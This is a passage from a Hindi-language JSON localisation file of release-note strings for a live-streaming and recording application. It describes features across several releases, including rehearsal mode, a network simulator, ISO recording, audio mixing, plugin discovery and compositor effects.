हुए मेहमान को मौजूदा P2P डेटा चैनल पर निजी टेक्स्ट संकेत भेजें (&quot;30 सेकंड&quot;, &quot;समेटें&quot;, &quot;अगली बारी आपकी&quot;, &quot;ज़ोर से बोलें&quot;)। मेहमान अपने जॉइन पेज या ऐप पर संकेत को लाइव काउंटडाउन के साथ देखता है — प्रोग्राम में कभी नहीं। कोई नई नेटवर्क सतह नहीं।","changelog.8eed1deed31f":"<strong>मेहमान कनेक्शन-गुणवत्ता डैशबोर्ड (CAP-N56)</strong> — हर मेहमान का लाइव QoS सारांश: राउंड-ट्रिप समय, पैकेट लॉस, प्राप्त रिज़ॉल्यूशन और फ़्रेमरेट, और जिटर, हरे/पीले/लाल बैज और इतिहास दिखाने वाली एक स्पार्कलाइन के साथ, ताकि &quot;आपका कनेक्शन बिगड़ रहा है&quot; दर्शकों के ध्यान देने से पहले ही दिख जाए।","changelog.a49bc0c0f6ee":"<strong>ऑटो-ग्रिड मेहमान लेआउट (CAP-N59)</strong> — बैठाए गए मेहमानों को अपने-आप बनने वाले 1–9 ग्रिड में व्यवस्थित करें, जो मेहमानों के जुड़ने, जाने या बैठाए जाने पर फिर से व्यवस्थित हो जाता है; हर सीट का नाम एक <code>{{guestN}}</code> वेरिएबल के रूप में प्रकाशित होता है, ताकि कोई टाइटल सोर्स अपने-आप अपडेट होने वाली नेमप्लेट बन जाए। बनावट से ही कोई ओवरलैप नहीं।","changelog.5b7dd4b9a43f":"<strong>कई मेहमानों वाले रिमोट सत्र</strong> — ऑप्ट-इन रिमोट-मेहमान ट्रांसपोर्ट अब एक साथ <strong>आठ तक मेहमान</strong> स्वीकार करता है (पहले एक), हर एक की अपनी टाइल, अपने म्यूट गेट, कनेक्शन गुणवत्ता, संकेत चैनल और एक क्लिक में बैठाने की सुविधा के साथ। यह अब भी वही पीयर-टू-पीयर सत्र है — मीडिया सीधे होस्ट और मेहमानों के बीच बहता है, कोई सर्वर नहीं, और जब तक आप किसी को आमंत्रित न करें, कुछ भी नहीं जुड़ता। चार मेहमानों के प्रदर्शन बजट तक सत्यापित; ज़्यादा मेहमान होस्ट की बैंडविड्थ और CPU पर निर्भर करते हैं।","changelog.c35af444edf6":"[0.700.0] — 2026-07-17 (स्ट्रीमिंग की विश्वसनीयता और समझ — चरण 6)","changelog.82098fd2d64d":"<em>रिहर्सल करें, मापें, समझाएँ।</em> चरण 6 इस बारे में है कि लाइव जाने से पहले आप जान सकें कि आपका शो टिका रहेगा, और बाद में समझ सकें कि क्या हुआ। अब आप पूरी पाइपलाइन को एक निजी लोकल सिंक पर, एक नकली ख़राब नेटवर्क के साथ चला सकते हैं, बेंचमार्क कर सकते हैं कि आपकी मशीन असल में कितना संभाल सकती है, हर रेंडर/एनकोड/री-कनेक्ट घटना की रिकॉर्ड की गई टाइमलाइन देख सकते हैं, और स्ट्रीम ख़त्म होने पर एक लिखित रिपोर्ट पा सकते हैं — साथ ही किसी भी सोर्स को सिर्फ़-स्ट्रीम या सिर्फ़-रिकॉर्डिंग के रूप में चिह्नित कर सकते हैं। सब कुछ डिफ़ॉल्ट रूप से बंद/तटस्थ है, और यहाँ कुछ भी कोई नेटवर्क कॉल नहीं जोड़ता: ड्राई रन और बेंचमार्क पूरी तरह लोकल हैं, और नेटवर्क सिम्युलेटर सिर्फ़ रिहर्सल के अपने लूपबैक सिंक को ही बिगाड़ता है — कभी किसी असली प्रसारण को नहीं।","changelog.be9efbd98807":"<strong>नेटवर्क स्थिति सिम्युलेटर (CAP-N48)</strong> — सिर्फ़ रिहर्सल के लिए एक नेटवर्क शेपर: नियतात्मक टोकन-बकेट बैंडविड्थ सीमाएँ, अतिरिक्त लेटेंसी/जिटर, और निर्धारित आउटेज, जो ड्राई-रन सिंक पर लागू होते हैं, ताकि आप शो के दिन से पहले एक पतले, बार-बार टूटते अपलिंक के सामने री-कनेक्ट का व्यवहार, मल्टीस्ट्रीम लेन का अलगाव और बिटरेट के विकल्प परख सकें। &quot;होटल वाई-फ़ाई&quot; और मोबाइल हॉटस्पॉट के प्रीसेट, साथ में पूरी तरह कस्टम प्रोफ़ाइल। नियतात्मक (हर बार वही अभ्यास) और बनावट से ही किसी असली &quot;लाइव जाएँ&quot; को छूने में असमर्थ।","changelog.37e19bbed36e":"<strong>ड्राई-रन मोड / &quot;लाइव जाएँ (रिहर्सल)&quot; (CAP-N49)</strong> — पूरी लाइव पाइपलाइन — कंपोज़िटर, एनकोडर, mux और असली री-कनेक्ट लॉजिक — को ऐप के अपने लूपबैक सिंक पर, असली स्टैट्स डॉक, लाइव-स्थिति वाले UI और अलार्म के साथ चलाएँ, ताकि पूरे शो का रिहर्सल हो और <strong>मशीन से एक भी बाइट बाहर न जाए</strong>। एक अलग बैंगनी रिहर्सल बटन, हर लाइव सतह पर एक रिहर्सल बैज और एक स्थिति बैनर रिहर्सल को असली प्रसारण समझने की ग़लती को असंभव बना देते हैं; स्ट्रीम कुंजियाँ पढ़ी तक नहीं जातीं, इसलिए शो से पहले का ड्राई रन कुंजियाँ बनने से पहले भी काम करता है।","changelog.85d495ae89bc":"<strong>छूटे फ़्रेमों की फ़ोरेंसिक टाइमलाइन (CAP-N50)</strong> — पूरे सत्र की एक रिकॉर्ड की गई टाइमलाइन, जो रेंडर समय, एनकोडर कतार की गहराई, हर लक्ष्य का बिटरेट और ड्रॉप, री-कनेक्ट, सीन स्विच, मार्कर और अलार्म को एक ज़ूम करने योग्य ग्राफ़ पर आपस में जोड़ती है — बाद में &quot;43वें मिनट पर क्या हुआ?&quot; का जवाब। स्टैट्स डॉक <em>अभी</em> का हाल दिखाता है; यह पूरे सत्र को रिकॉर्ड करता है और समझाता है, और रेंडर लूप से बाहर सैंपल लेता है, ताकि 60 fps वाले कंपोज़ पाथ पर कोई अतिरिक्त काम न पड़े।","changelog.bb50bfcb281c":"<strong>स्ट्रीम सत्र रिपोर्ट (CAP-N51)</strong> — सत्र ख़त्म होने पर, रिकॉर्डिंग के बगल में लिखी जाने वाली एक वैकल्पिक लोकल HTML + Markdown रिपोर्ट: अपटाइम, हर लक्ष्य का औसत और अधिकतम बिटरेट, डाउनटाइम प्रतिशत, री-कनेक्ट लॉग, मार्कर, अलार्म और रिकॉर्डिंग पाथ। सिर्फ़ लोकल, जिसे सिर्फ़ आप ही साझा कर सकते हैं; डिफ़ॉल्ट रूप से बंद।","changelog.fbfd2e9fc49b":"<strong>एनकोडर बेंचमार्क विज़ार्ड (CAP-N52)</strong> — एक निर्देशित, पूरी तरह ऑफ़लाइन बेंचमार्क जो आपकी मशीन पर सचमुच छोटे एनकोड क्रम <em>चलाता</em> है (हर पहचाना गया एनकोडर × प्रीसेट × रिज़ॉल्यूशन × fps), हासिल हुए fps और बची क्षमता मापता है, और मापों के आधार पर कैनवस/एनकोडर/बिटरेट सेटिंग्स सुझाता है — एक क्लिक में लागू करने की सुविधा के साथ। विफलताएँ सूचीबद्ध की जाती हैं, कभी छिपाई नहीं जातीं, इसलिए जो एनकोडर आपकी मशीन पर उपलब्ध है पर टिक नहीं पाता, उसे चुपचाप हटाने के बजाय दर्ज किया जाता है। यह पहली बार चलने वाले विज़ार्ड से अलग है, जो सिर्फ़ क्षमताएँ जाँचता है और अनुमान लागू करता है; यह मापता है। लाइव या रिकॉर्डिंग के दौरान इसे चलाने से मना कर दिया जाता है, ताकि यह शो के बीच कभी एनकोडर न छीने।","changelog.7893b3df0384":"<strong>हर आउटपुट के लिए सोर्स की दृश्यता (CAP-N53)</strong> — एक ही कैनवस के भीतर किसी भी सीन आइटम को स्ट्रीम पर दिखने वाला पर रिकॉर्डिंग में नहीं, या इसका उलटा, चिह्नित करें — अलर्ट और चैट लाइव फ़ीड पर रखें, जबकि VOD रिकॉर्डिंग साफ़ रहे। हर सोर्स पंक्ति पर होवर करने पर <strong>लाइव</strong> / <strong>REC</strong> टॉगल दिखते हैं; मुख्य आँख वाला टॉगल अब भी सब कुछ नियंत्रित करता है, और ऑपरेटर का प्रीव्यू, प्रोजेक्टर और मल्टीव्यू हमेशा पूरा प्रोग्राम दिखाते हैं।","changelog.fd1925b97ec5":"<strong>लूप होने वाले टेक्स्ट और विज्ञापन इफ़ेक्ट (Text FX)</strong> — बिना देखरेख चलने वाले प्रोमो/विज्ञापन लूप के लिए तीन नए आइटम फ़िल्टर: एक <strong>परिप्रेक्ष्य</strong> फ़िल्टर जो किसी भी सोर्स (टेक्स्ट, कैमरे, कैप्चर) को एक सपाट तल की तरह दर्शक से दूर झुका देता है, दूर वाले किनारे पर वैकल्पिक फ़ेड के साथ — पूरे &quot;Star Wars&quot; जैसे ओपनिंग क्रॉल के लिए इसे मौजूदा अनंत <strong>स्क्रॉल</strong> फ़िल्टर के बाद जोड़ें — और एक <strong>फ़ेड लूप</strong> फ़िल्टर जो किसी आइटम को फ़ेड इन करता है, कुछ देर रोके रखता है, फ़ेड आउट करता है, और फिर छिपाए रखता है, एक दोहराए जाने वाले चक्र में। सब कुछ समय से चलता है, इसलिए विज्ञापन अपने-आप चलता रहता है।","changelog.f557861d47ae":"[0.600.0] — 2026-07-16 (रिकॉर्डिंग और रीप्ले की गहराई — चरण 5)","changelog.baab6b442a79":"<em>फ़ाइल के आसपास की हर चीज़।</em> चरण 5 यह विकसित करता है कि किसी रिकॉर्डिंग के डिस्क पर पहुँचने से पहले, उसके दौरान और उसके बाद क्या होता है: हर सोर्स की अलग फ़ाइलें, एक क्लिप ट्रिमर, असली पारदर्शिता, घटनाओं पर आधारित विभाजन और चैप्टर मार्कर, रिकॉर्डिंग के बाद के कामों की एक पाइपलाइन, एक अखंडता सत्यापक, और SMPTE LTC टाइमकोड। हर नई क्षमता डिफ़ॉल्ट रूप से बंद/तटस्थ है — बिना छेड़ी गई रिकॉर्डिंग बिट-दर-बिट पहले जैसी ही है — और यहाँ कुछ भी कोई नेटवर्क कॉल नहीं जोड़ता।","changelog.56eaf8f0fe4b":"<strong>हर सोर्स की ISO रिकॉर्डिंग (CAP-N40)</strong> — चुने गए सोर्स को प्रोग्राम के साथ-साथ उनकी अपनी फ़ाइलों में साफ़ रिकॉर्ड करें, कंपोज़िट से पहले (सोर्स के फ़िल्टर के साथ या बिना), कैनवस के आकार और फ़्रेम दर पर, ताकि हर ISO एडिटिंग टाइमलाइन पर प्रोग्राम के साथ संरेखित होकर बैठे। हर रिमोट मेहमान बस एक सोर्स है, इसलिए हर मेहमान के ISO मुफ़्त में मिल जाते हैं। हर लेन का अपना कंटेनर/एनकोडर; ऑडियो फ़िल्टर के बाद, पर fader/म्यूट से पहले लिया जाता है (मिक्स का कोई फ़ैसला कभी किसी ISO फ़ाइल को ख़ामोश नहीं करता); पैनिक बटन ISO लेन को भी रोक देता है। जब तक सोर्स न चुने जाएँ, बंद; हर लेन की लागत के बारे में शुरू में ही ईमानदार मार्गदर्शन।","changelog.070729b0bdcf":"<strong>रीप्ले और क्लिप ट्रिमर (CAP-N41)</strong> — किसी भी सहेजी गई wire-फ़ॉर्मैट रिकॉर्डिंग के लिए एक हल्की ट्रिम विंडो: लाइव प्रीव्यू के साथ फ़्रेम-दर-फ़्रेम इन/आउट पॉइंट, और एक ईमानदार एक्सपोर्ट बैज जो पहले ही बता देता है कि क्लिप <strong>stream-copy</strong> होगी (कीफ़्रेम से संरेखित इन-पॉइंट — लगभग तुरंत, लॉसलेस) या फिर से एनकोड होगी। एक क्लिक वर्टिकल-कैनवस ज्यामिति के ज़रिए इसे 9:16 वर्टिकल मास्टर में फिर से फ़्रेम कर देता है।","changelog.a785df0dd1f8":"<strong>अल्फ़ा-चैनल रिकॉर्डिंग (CAP-N42)</strong> — प्रोग्राम को असली पारदर्शिता के साथ ऐप के अपने <code>.frec</code> में रिकॉर्ड करें (एक नया हेडर फ़्लैग; फ़ॉर्मैट संस्करण नहीं बदला है, इसलिए अल्फ़ा फ़ाइलें हर जगह चलने योग्य रहती हैं और पुरानी फ़ाइलें अपारदर्शी रूप में पढ़ी जाती हैं)। रिकॉर्डर को अपना अलग, पारदर्शी पृष्ठभूमि वाला रेंडर मिलता है, इसलिए प्रीव्यू और स्ट्रीम में सामान्य अपारदर्शी प्रोग्राम ही रहता है। लेबल किए गए ffmpeg कंपोनेंट के ज़रिए NLE के लिए <strong>ProRes 4444</strong> या <strong>QuickTime Animation (QTRLE)</strong> <code>.mov</code> मास्टर में एक्सपोर्ट करें।","changelog.79e72558f2ad":"<strong>सीन बदलने / मार्कर पर विभाजन (CAP-N43)</strong> — ऐप के अपने <code>.frec</code> स्प्लिटर के लिए नए घटना ट्रिगर: सीन स्विच होने पर, चैप्टर मार्कर लगने पर, या शो रनडाउन के किसी चरण पर एक नई पार्ट फ़ाइल शुरू करें। हर हिस्सा ठीक घटना वाले फ़्रेम की सीमा से शुरू होता है (हिस्से की न्यूनतम लंबाई एक सेकंड, ताकि घटनाओं की बौछार फ़ाइलों के टुकड़े-टुकड़े न कर दे)। wire कंटेनर सिर्फ़ समय के आधार पर विभाजित होते हैं, और यह बात सेटिंग्स में साफ़ लिखी है।","changelog.ef021f62a151":"<strong>घटनाओं से अपने-आप मार्कर (CAP-N44)</strong> — स्टूडियो की घटनाओं से अपने-आप लगने वाले चैप्टर मार्कर — सीन स्विच, रीप्ले सहेजना, स्ट्रीम का फिर से जुड़ना, छूटे फ़्रेमों की बौछार, अलार्म बजना और रूल-इंजन की क्रियाएँ — हर एक प्रकार बताने वाले लेबल के साथ, मौजूदा मैनुअल मार्कर हॉटकी के साथ-साथ। लेबल mkv चैप्टर शीर्षकों और <code>.chapters.txt</code> साइडकार में चले जाते हैं।","changelog.5e520f7a947e":"<strong>रिकॉर्डिंग-पश्चात पाइपलाइन (CAP-N45)</strong> — हर प्रोफ़ाइल के लिए रिकॉर्डिंग के बाद के कामों की एक श्रृंखला, एक <strong>बंद, sandboxed</strong> क्रिया-समूह से: जाँचें → MP4 में रीमक्स करें → लाउडनेस सामान्य करें → नामकरण नियम लागू करें → फ़ोल्डर में ले जाएँ/कॉपी करें → फ़ाइल प्रबंधक में दिखाएँ → Lua स्क्रिप्ट्स को सूचित करें। लाइव कतार दृश्य के साथ बैकग्राउंड में चलती है; पहली विफलता पर श्रृंखला रुक जाती है। इसमें जान-बूझकर कोई &quot;कमांड चलाएँ&quot; चरण नहीं है।","changelog.792a44452b11":"<strong>रिकॉर्डिंग अखंडता सत्यापक (CAP-N46)</strong> — एक तेज़ लोकल जाँच (फ़ाइल पूरी होने के बाद या माँगने पर) जो कंटेनर की संरचना, अंतिम ट्रेलर, वीडियो फ़्रेम की निरंतरता, हर ट्रैक के ऑडियो सैंपल की निरंतरता, A/V इंटरलीव का अंतर, और रिकॉर्डर की घड़ी के मुक़ाबले अवधि जाँचती है, और सरल भाषा में ठीक / चेतावनी / विफल रिपोर्ट देती है। ऐप के अपने <code>.frec</code> की गहराई से जाँच होती है; wire फ़ाइलों को ffmpeg से संरचना + डिकोड-त्रुटि की ईमानदार स्कैन मिलती है।","changelog.42ea336f6972":"<strong>LTC टाइमकोड सोर्स और रीडर (CAP-N47)</strong> — ऐप का अपना SMPTE 12M लीनियर-टाइमकोड जनरेटर और रीडर (क्लासिक ऑडियो टाइमकोड, पूरी तरह ऑफ़लाइन)। LTC को असाइन किए जा सकने वाले मिक्सर ट्रैक पर बनाएँ (उसे रिकॉर्ड करें या बाहरी उपकरणों तक भेजें); किसी भी ऑडियो इनपुट से आने वाला LTC पढ़ें, ताकि सिस्टम-स्टैट्स ओवरले पर बर्न-इन टाइमकोड पंक्ति और LTC मुहर वाले चैप्टर मार्कर चल सकें। 24/25/30 fps पर ±1 फ़्रेम तक सटीक राउंड-ट्रिप।","changelog.157723e79681":"<strong>वर्टिकल रिकॉर्डिंग चलने पर चैप्टर एम्बेडिंग अब कमज़ोर नहीं पड़ती।</strong> mkv चैप्टर-एम्बेड जाँच अब सिर्फ़ मुख्य रिकॉर्डिंग की फ़ाइल को देखती है, इसलिए साथ-साथ चल रही वर्टिकल (या ISO) फ़ाइल अब एक-फ़ाइल वाली mkv रिकॉर्डिंग को साइडकार वाले रास्ते पर नहीं धकेलती।","changelog.8d45b8a98d91":"[0.500.0] — 2026-07-15 (ऑडियो प्रोडक्शन की गहराई — चरण 4)","changelog.b7c13c220405":"<em>मिक्सर से कंसोल तक।</em> चरण 4 शिप हो चुके मिक्सर को एक ब्रॉडकास्ट कंसोल में बदल देता है: फ़िज़िकल आउटपुट रूटिंग और aux/cue मिक्स, एक N×M डकिंग मैट्रिक्स, गेन बाँटने वाला ऑटो-मिक्सर, EBU R128 लाउडनेस सामान्यीकरण (लाइव राइडर + रिकॉर्डिंग के बाद की प्रोसेसिंग), लाइव स्पेक्ट्रम के साथ पैरामीट्रिक EQ, एक डी-एसर और रंबल गार्ड, एक साउंडबोर्ड, सिर्फ़-ऑडियो (पॉडकास्ट) रिकॉर्डिंग, एक-क्लिक वॉइस-चेन प्रीसेट के साथ हर मेहमान का mix-minus, और CLAP <strong>और VST3</strong> प्लगइन होस्टिंग के लिए खोज + MIT-साफ़ नींव। सब कुछ ऐप का अपना क्लासिक DSP है — चार्टर के अनुसार कोई ML नहीं — और डिफ़ॉल्ट रूप से बंद/तटस्थ शिप होता है, इसलिए बिना छेड़ा गया मिक्स बिट-दर-बिट पहले जैसा ही है।","changelog.5159ad1b9251":"<strong>Aux बस और फ़िज़िकल आउटपुट रूटिंग (CAP-N30)</strong> — मास्टर मिक्स या छह ट्रैक बसों में से किसी को भी अतिरिक्त फ़िज़िकल आउटपुट डिवाइस तक भेजें, हर एक के अपने ट्रिम के साथ, एक <strong>रूटिंग</strong> मैट्रिक्स से (ऑडियो मिक्सर का रूटिंग बटन)। हेडफ़ोन पर भेजी गई ट्रैक बस एक cue मिक्स है जो मॉनिटर से अलग होती है। डिफ़ॉल्ट रूप से बिल्कुल आज वाला व्यवहार (सिर्फ़ मॉनिटर बस किसी डिवाइस तक पहुँचती है)।","changelog.d41c3c08bea2":"<strong>साइडचेन डकिंग मैट्रिक्स (CAP-N31)</strong> — कौन किसे डक करता है, इसका एक समेकित <strong>डकिंग</strong> ग्रिड: कोई भी सोर्स किसी भी समूह को डक कर सकता है, हर जोड़ी की अपनी गहराई, थ्रेशोल्ड, अटैक और रिलीज़ के साथ। इंजन हर स्ट्रिप पर कई डकर एक के ऊपर एक लगाता है, इसलिए एक स्ट्रिप एक साथ कई ट्रिगर से डक हो सकती है।","changelog.b732fddcfca9":"<strong>गेन बाँटने वाला ऑटो-मिक्सर (CAP-N32)</strong> — हर स्ट्रिप के लिए Dugan-शैली का <strong>ऑटो-मिक्स</strong> टॉगल: ऑटो-मिक्स किए गए सभी माइक में कुल गेन लगभग स्थिर रखा जाता है और जो बोल रहा हो उसे सौंप दिया जाता है (एक नियतात्मक नियम, जिसमें गेन का योग एक रहता है), कई होस्ट वाले पैनल और पॉडकास्ट के लिए आदर्श। डिफ़ॉल्ट रूप से बंद।","changelog.ca003a06d04f":"<strong>EBU R128 लाउडनेस सामान्यीकरण (CAP-N34)</strong> — एक लाइव <strong>लाउडनेस राइडर</strong> प्रोग्राम को एक लक्ष्य (−14 / −16 / −23 LUFS) की ओर ले जाता है, एक पीक सीमा के साथ, और यह मास्टर और हर ट्रैक बस पर लागू होता है ताकि रिकॉर्डिंग और स्ट्रीम एक जैसे स्तर पर रहें; साथ में रिकॉर्डिंग सूची पर रिकॉर्डिंग के बाद चलने वाली एक <strong>सामान्यीकृत करें</strong> क्रिया (ffmpeg <code>loudnorm</code>)। डिफ़ॉल्ट रूप से बंद।","changelog.01407091e030":"<strong>पैरामीट्रिक EQ + स्पेक्ट्रम व्यू (CAP-N35)</strong> — एक N-बैंड पैरामीट्रिक EQ (bell / low-shelf / high-shelf / notch / high-pass / low-pass), <strong>लाइव स्पेक्ट्रम एनालाइज़र के ऊपर खींचे जा सकने वाले नोड</strong> के साथ; कर्व वही RBJ गणित है जो इंजन चलाता है। ऐप का अपना FFT; एनालाइज़र हर स्ट्रिप के लिए सिर्फ़ तब सक्रिय होता है जब एडिटर खुला हो।","changelog.42a294780d05":"<strong>डी-एसर + रंबल गार्ड (CAP-N36)</strong> — एक स्प्लिट-बैंड <strong>डी-एसर</strong> (एक सिबिलेंस डिटेक्टर एक डायनैमिक high-shelf कटौती चलाता है, फ़ेज़-सही, कोई ML नहीं) और मेज़ की धमक और प्लोसिव के लिए एक साफ़ दूसरे क्रम का लो-कट <strong>रंबल गार्ड</strong> — दोनों सामान्य ऑडियो फ़िल्टर के रूप में।","changelog.29e99512428d":"<strong>साउंडबोर्ड (CAP-N37)</strong> — लोकल ऑडियो क्लिप का एक पैड ग्रिड, हर पैड के अपने गेन, choke समूह (नया पैड अपने समूह के पिछले पैड को रोक देता है), लूप, हॉटकी, ट्रैक असाइनमेंट, और पैड बजते समय बाक़ी मिक्स को वैकल्पिक रूप से अपने-आप डक करने की सुविधा के साथ। पैड लेबल किए गए ffmpeg कंपोनेंट से डिकोड होकर किसी भी सोर्स की तरह मिक्सर में जाते हैं।","changelog.251ef95cea94":"<strong>सिर्फ़-ऑडियो रिकॉर्डिंग (CAP-N38)</strong> — एक <strong>पॉडकास्ट मोड</strong> जो ऐप के अपने राइटर से हर ट्रैक का <strong>WAV</strong> रिकॉर्ड करता है (कोई वीडियो एनकोडर शुरू ही नहीं होता), और वैकल्पिक रूप से लेबल किए गए ffmpeg कंपोनेंट से <strong>FLAC/Opus</strong> में ट्रांसकोड करता है, साइडकार में लिखे गए ख़ामोशी छोड़ने वाले मार्कर और CAP-M25 फ़ाइल-नाम टेम्पलेट के साथ। रिकॉर्डिंग डायलॉग से।","changelog.d0ae0d751fe2":"<strong>हर मेहमान का mix-minus और वॉइस-चेन प्रीसेट (CAP-N39)</strong> — एक क्लिक वाले <strong>वॉइस-चेन प्रीसेट</strong> (broadcast / podcast / साफ़ gate→comp→EQ→limiter चेन) जिन्हें किसी भी स्ट्रिप पर लागू किया जा सकता है, और हर सोर्स के लिए ऐप का अपना <strong>Mix-minus (N−1)</strong> रिटर्न (उस सोर्स को छोड़कर प्रोग्राम में मौजूद हर कोई), ताकि रिमोट मेहमान को कोई गूँज न सुनाई दे।","changelog.d1c450a7bdfb":"<strong>ऑडियो प्लगइन — CLAP + VST3 खोज (CAP-N33)</strong> — एक <strong>प्लगइन</strong> पैनल जो मानक फ़ोल्डरों में आपके इंस्टॉल किए गए <strong>CLAP और VST3</strong> प्लगइन ढूँढता है (ऑप्ट-इन, सिर्फ़ लोकल डायरेक्टरी, कुछ भी डाउनलोड नहीं)। दोनों फ़ॉर्मैट MIT-लाइसेंस वाले और $0 में साफ़ हैं; लाइव होस्टिंग हर प्लगइन को उसकी अपनी GUI के साथ एक क्रैश से अलग-थलग प्रोसेस में चलाती है — होस्ट-प्रोसेस का यह इंटीग्रेशन अभी प्रगति पर है, और पैनल नकली टॉगल दिखाने के बजाय योजना साफ़-साफ़ बताता है।","changelog.1002a64a6813":"<strong>लाइव फ़िल्टर विज़ुअलाइज़र (प्लगइन का ख़ास प्रदर्शन)</strong> — हर ऑडियो फ़िल्टर अब अपना एडिटर खुला रहने पर एक दृश्य उपकरण बन जाता है: डायनैमिक्स (कंप्रेसर / लिमिटर / गेट) के लिए एक <strong>ट्रांसफ़र कर्व</strong> जिस पर लाइव सिग्नल चलता दिखता है, टोन फ़िल्टर (EQ / डी-एसर / रंबल गार्ड) के लिए एक <strong>फ़्रीक्वेंसी-रिस्पॉन्स कर्व</strong>, या बाक़ी के लिए एक लेवल रीडआउट — हर एक के बगल में ऑडियो के साथ हिलने वाले <strong>इन / आउट / गेन-रिडक्शन मीटर</strong>, उसी आकर्षक डार्क-एनालाइज़र रूप में जो पैरामीट्रिक EQ का है।","changelog.5fbac10a716a":"<strong>Windows इंस्टॉल पर डेस्कटॉप शॉर्टकट</strong> — MSI अब एक <strong>Freally Capture</strong> डेस्कटॉप शॉर्टकट बनाता है (अनइंस्टॉल पर हटा दिया जाता है)।","changelog.2a6141e43be0":"बदला गया","changelog.015b6bb3a57b":"<strong>VST3 अब MIT-लाइसेंस वाला है।</strong> Steinberg ने <strong>2025-10-29</strong> को VST 3.8 SDK का लाइसेंस बदलकर MIT कर दिया, इसलिए पहले वाला &quot;VST3 GPLv3-या-प्रोप्राइटरी है, असंगत&quot; नोट <code>vst.rs</code>, <code>claphost.rs</code> और <code>THIRD-PARTY-NOTICES.md</code> में सुधारा गया — VST3 अब CLAP के बराबर ही एक $0-साफ़ प्लगइन रास्ता है।","changelog.eaa014cf0965":"[0.400.0] — 2026-07-15 (कंपोज़िटर और FX की गहराई — चरण 3 पूरा)","changelog.c2a0fb6beabd":"चरण 3 का दूसरा हिस्सा टाले गए पाँच मोशन-और-इफ़ेक्ट फ़ीचर लाता है और चरण को पूरा करता है: एक <strong>मूव (मॉर्फ़) ट्रांज़िशन</strong>, <strong>ट्रांज़िशन नियम</strong>, उपयोगकर्ता के WGSL इफ़ेक्ट के लिए एक <strong>शेडर स्टूडियो</strong>, एक <strong>बेज़ियर मास्क</strong> एडिटर, और वैकल्पिक प्रोग्राम-ऑडियो डक के साथ <strong>ट्रैक-मैट स्टिंगर</strong>। साथ में सहायता मेन्यू के उन दो लिंक का सुधार जो कुछ नहीं करते थे।","changelog.9b85d048fa23":"<strong>मूव (मॉर्फ़) ट्रांज़िशन (CAP-N20)</strong> — एक नए प्रकार का ट्रांज़िशन: जो आइटम जाने वाले और आने वाले, <em>दोनों</em> सीन में होते हैं (एक ही सोर्स), वे कट होने के बजाय अपनी पुरानी स्थिति/स्केल/घुमाव/क्रॉप से नई स्थिति तक एनिमेट होते हैं; जो आइटम सिर्फ़ एक सीन में हैं, वे फ़ेड इन या आउट होते हैं। smootherstep ईज़िंग के साथ, ताकि गति धीरे-धीरे तेज़ हो और धीरे-धीरे थमे।","changelog.ccf72b961a2f":"<strong>ट्रांज़िशन नियम (CAP-N21)</strong> — हर सीन-जोड़ी के लिए एक ट्रांज़िशन मैट्रिक्स (<strong>उपकरण → ट्रांज़िशन नियम</strong>): सीन A→B डिफ़ॉल्ट के बजाय अपना प्रकार और अवधि इस्तेमाल कर सकता है। साथ में हर आइटम के लिए <strong>दिखाने/छिपाने पर फ़ेड-इन</strong> (ट्रांसफ़ॉर्म संपादित करें → रिवील): कोई आइटम दिखाए जाने पर धीरे-धीरे उभरता है। सभी ब्लेंड और मूव ट्रांज़िशन अब ईज़िंग के साथ चलते हैं।","changelog.cd2edf9cde0e":"<strong>शेडर स्टूडियो (CAP-N22)</strong> — एक <strong>उपयोगकर्ता WGSL इफ़ेक्ट</strong> को फ़िल्टर के रूप में लिखें: उसे रनटाइम पर कंपाइल और सत्यापित किया जाता है (अमान्य शेडर को अनदेखा किया जाता है — सोर्स बिना फ़िल्टर के रेंडर होता है, कभी क्रैश नहीं), <code>// @param</code> एनोटेशन से अपने-आप बनने वाले स्लाइडर, लाइव संपादन और एक बिल्ट-इन गैलरी (ग्रेस्केल, इनवर्ट, स्कैनलाइन, विनेट) के साथ।","changelog.51dd65cc8ab0":"<strong>बेज़ियर मास्क (CAP-N28)</strong> — एक <strong>फ़्रीहैंड मास्क</strong> फ़िल्टर: एक बंद पाथ बनाएँ (हैंडल खींचें, जोड़ने के लिए डबल-क्लिक, हटाने के लिए राइट-क्लिक), प्रीसेट आकृतियों, हर किनारे के फ़ेदर और इनवर्ट के साथ। आकृति से उभरने वाले ट्रांज़िशन के लिए किसी भी पाथ को ग्रेस्केल <strong>luma-wipe</strong> पैटर्न के रूप में एक्सपोर्ट करें।","changelog.1e693f57a778":"<strong>ट्रैक-मैट स्टिंगर (CAP-N29)</strong> — कोई स्टिंगर अपनी पारदर्शिता को <strong>ट्रैक मैट</strong> के रूप में ला सकता है (फ़िल और मैट <strong>साथ-साथ</strong> या <strong>ऊपर-नीचे</strong> पैक किए हुए), ताकि हर पिक्सेल का अल्फ़ा उन कोडेक में भी बचा रहे जो उसे हटा देते हैं (H.264/HEVC)। वैकल्पिक रूप से, स्टिंगर के चलने के दौरान उसकी अपनी आवाज़ के नीचे <strong>प्रोग्राम ऑडियो को डक करें</strong>।","changelog.646680d87464":"<strong>सहायता → वेबसाइट देखें और सहायता पोर्टल कुछ नहीं करते थे।</strong> ये मेन्यू लिंक (और परिचय डायलॉग में यही लिंक) इस बात पर निर्भर थे कि webview <code>target=&quot;_blank&quot;</code> खोलेगा, जो यह Tauri बिल्ड कभी नहीं करता। अब वे ऐप के जाँचे-परखे opener के ज़रिए OS ब्राउज़र खोलते हैं — <strong>वेबसाइट देखें</strong> → होमपेज, <strong>सहायता पोर्टल</strong> → दस्तावेज़ीकरण पेज।","changelog.e322c5f672ae":"[0.310.0] — 2026-07-14 (कंपोज़िटर और FX की गहराई — चरण 3, भाग 1)","changelog.2d984c4daa81":"चरण 3 (कंपोज़िटर और FX की गहराई) का पहला हिस्सा: मोशन और इफ़ेक्ट कैनवस तक पहुँचते हैं — नई ब्लर शैलियाँ, एक 3D झुकाव, एक फ़्रीज़-फ़्रेम, एक-क्लिक सोर्स क्लोन, और ब्रॉडकास्ट-शैली के <strong>डाउनस्ट्रीम कीयर</strong> जो हर सीन के ऊपर रहते हैं। साथ में 0.301.0 के बारे में रिपोर्ट किए गए तीन सुधार — जिनमें प्रोजेक्टर की एक ऐसी गड़बड़ी भी है जो पूरे डेस्कटॉप को जाम कर सकती थी।","changelog.dbef37c22c9b":"<strong>ब्लर परिवार (CAP-N27)</strong> — Gaussian ब्लर के साथ चार नए GPU फ़िल्टर: <strong>दिशात्मक</strong> (किसी कोण के साथ गति की लकीर), <strong>रेडियल</strong> (किसी केंद्र के चारों ओर घुमाव), <strong>ज़ूम</strong> (डॉली-ज़ूम लकीर), और <strong>पिक्सेलेट</strong> (मोज़ेक)। हर 